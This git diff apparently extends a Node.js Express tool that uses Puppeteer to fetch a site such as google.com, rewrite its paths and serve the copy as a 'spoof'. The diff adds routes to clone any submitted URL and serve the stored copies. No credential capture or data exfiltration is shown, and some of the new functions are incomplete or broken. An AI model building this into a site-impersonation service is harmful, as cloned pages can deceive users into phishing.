@@ -5,13 +5,18 @@ const puppet = require('puppeteer')
 const fs = require('fs/promises')
 const isURL = require('is-url')
 const path = require('path')
+const bodyparser = require('body-parser')
+const Page = require('./models/Page')
 let spoofURL = "https://www.google.com"
 const log = console.log
 const PORT = 8888
 const app = exp()
 let downloaded_page = ''
 let rendered_page = ''
-let page_object = {}
+
+const pages = {
+
+}
 
 // check for args
 let args = process.argv
@@ -23,7 +28,7 @@ if(args[2] && isURL(args[2])){
 } 
 
 // start headless browser
-async function download_page(){
+async function download_page(url){
     log('Fetching')
     const browser = await puppet.launch()
     const page = await browser.newPage()
@@ -33,7 +38,7 @@ async function download_page(){
     })
     downloaded_page = await page.content()
 }
-function render_page(){
+function render_page(url){
     log('Rendering page')
 //  parse to dom and alter paths
     let dom = cheer.load(downloaded_page)
@@ -49,12 +54,7 @@ function render_page(){
     createLog(rendered_page)
     log(`${spoofURL} spoof rendered.`)
 }
-// easy to view log of rendered input/output
-async function createLog(string){
-    let filename = "log.txt"
-    await fs.writeFile(path.join(__dirname, "logs", filename), `rendered page - \n ${string}\ndownloaded page - \n ${downloaded_page}`)
 
-}
 async function initiate(){
     await download_page()
     render_page()
@@ -83,8 +83,48 @@ app.listen(PORT, (err) => {
     log(`Server running on port ${PORT}`)
 })
 
-// Routing
+// MIDDLEWARE
+app.use(bodyparser.urlencoded({extended: false}))
+app.use(bodyparser.json())
 
+// ROUTING
+// spoof page
+app.get('/:spoof_url', (req, res)=>{
+    // 404 on non existant spoof or invalid url
+    if(!isURL(req.params.spoof_url)) return res.sendStatus(404)
+    if(!pages[req.params.spoof_url]) return res.sendStatus(404)
+    res.send(pages[req.params.spoof_url].rendered_page)
+})
+// main page
 app.get('/', (req, res) => {
     res.send(rendered_page)
 })
+// initiate new spoof
+app.post('/spoof', async (req, res)=>{
+    let url_2_spoof = req.body.url
+    let new_url = await create_spoof(url_2_spoof) // should return new path of spoofed page
+    return res.redirect(`${new_url}`) // redirect to spoofed route /:spoof_url
+})
+async function create_spoof(url){
+    let new_page = new Page()
+    new_page.download_page = await download_page(url)
+    new_page.rendered_page = await render_page(url)
+    new_page.url = url
+    pages[url] = new_page // set into global pages object
+    // create socket session
+
+
+    return new_page.url
+}
+
+
+
+
+
+// DEBUGGING
+// easy to view log of rendered input/output
+async function createLog(string){
+    let filename = "log.txt"
+    await fs.writeFile(path.join(__dirname, "logs", filename), `rendered page - \n ${string}\ndownloaded page - \n ${downloaded_page}`)
+
+}
